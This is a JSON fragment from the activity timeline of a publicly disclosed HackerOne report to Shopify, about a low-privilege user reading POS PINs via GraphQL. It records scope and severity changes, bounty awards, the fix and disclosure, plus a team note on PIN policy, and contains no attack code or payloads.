Apps","genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10555322,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2021-02-02T20:27:53.181Z","updated_at":"2021-02-02T20:27:53.181Z","actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"old_scope":"Shopify Developed Apps","new_scope":"your-store.myshopify.com","genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10555329,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2021-02-02T20:28:12.128Z","updated_at":"2021-02-02T20:28:12.128Z","additional_data":{"old_severity":"Medium (6.5)","new_severity":"Medium (5.4)","old_severity_id":972940,"new_severity_id":974489},"actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10557317,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tescoramen The attack is performed on `your-store.myshopify.com`, so it is supposed to be in core. Can you review? Thanks!","automated_response":false,"created_at":"2021-02-02T23:37:55.160Z","updated_at":"2021-02-02T23:37:55.160Z","actor":{"username":"ramsexy","cleared":true,"url":"/ramsexy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/075/704/f83ab3bbb51294b11bd1f58eb00a5259155baa1d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10562431,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-02-03T14:32:06.014Z","updated_at":"2021-02-03T14:32:06.014Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"925.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"smsecurity","url":"/smsecurity"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10562432,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-02-03T14:32:06.250Z","updated_at":"2021-02-03T14:32:06.250Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"925.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"the_arch_angel","url":"/the_arch_angel"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10562433,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-02-03T14:32:06.441Z","updated_at":"2021-02-03T14:32:06.441Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"925.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"c0rv4x","url":"/c0rv4x"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10562434,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-02-03T14:32:06.636Z","updated_at":"2021-02-03T14:32:06.636Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"925.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"ramsexy","url":"/ramsexy"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10562465,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ramsexy,\n\nPer your discussion with the Shopify team, the environment score (and subsequently bounty) has been updated.\n\n## Base Score CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N 5.4\n## Environment: Core\n\nThanks!","automated_response":false,"created_at":"2021-02-03T14:35:18.924Z","updated_at":"2021-02-03T14:35:18.924Z","actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10872639,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @ramsexy, thanks again for the report.\n\nWe're just reaching out to let you know that a fix for this issue has been shipped and verified. As such, we'll resolve this report.\n\nCheers.","automated_response":false,"created_at":"2021-03-04T00:26:17.732Z","updated_at":"2021-03-04T00:26:17.732Z","actor":{"username":"alex_richter","cleared":false,"url":"/alex_richter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ramsexy","url":"/ramsexy"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10919953,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":true,"created_at":"2021-03-08T17:07:42.008Z","updated_at":"2021-03-08T17:07:42.008Z","additional_data":{"old_title":"[Yaworski's Broskis] Low privilege user can read POS PINs via graphql and elevate his privilege","new_title":"[h1-2102] [Yaworski's Broskis] Low privilege user can read POS PINs via graphql and elevate his privilege"},"actor":{"username":"h1-2102-transfer-bot","cleared":false,"url":"/h1-2102-transfer-bot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11324114,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-04-08T18:53:30.362Z","updated_at":"2021-04-08T18:53:30.362Z","first_to_agree":true,"actor":{"username":"abdulwahaab_ahmed","cleared":false,"url":"/abdulwahaab_ahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/726/fa53e0dd37718653edc8e2abea4724f3d0af03e9_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11324406,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-04-08T19:33:15.868Z","updated_at":"2021-04-08T19:33:15.868Z","actor":{"username":"ramsexy","cleared":true,"url":"/ramsexy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/075/704/f83ab3bbb51294b11bd1f58eb00a5259155baa1d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11324407,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-04-08T19:33:15.984Z","updated_at":"2021-04-08T19:33:15.984Z","actor":{"username":"ramsexy","cleared":true,"url":"/ramsexy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/075/704/f83ab3bbb51294b11bd1f58eb00a5259155baa1d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":60052,"category":"team","content":"Note: The situation with PIN access has changed since the time of this report. PINs no longer require Full Admin permissions in order to be read in Shopify Admin. PINs are primarily a client-side control for the actual POS terminal, meant to be a layer of protection for scenarios in which someone external to the shop approaches a terminal in a retail location. For this reason, we no longer accept reports about being able to read or bruteforce PINs as another staff member on the same shop.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":75410,"username":"jenn-shopify","name":"jenn","bio":"","cleared":false,"website":null,"location":"","created_at":"2016-05-09T18:26:09.949Z","url":"https://hackerone.com/jenn-shopify","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"company","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}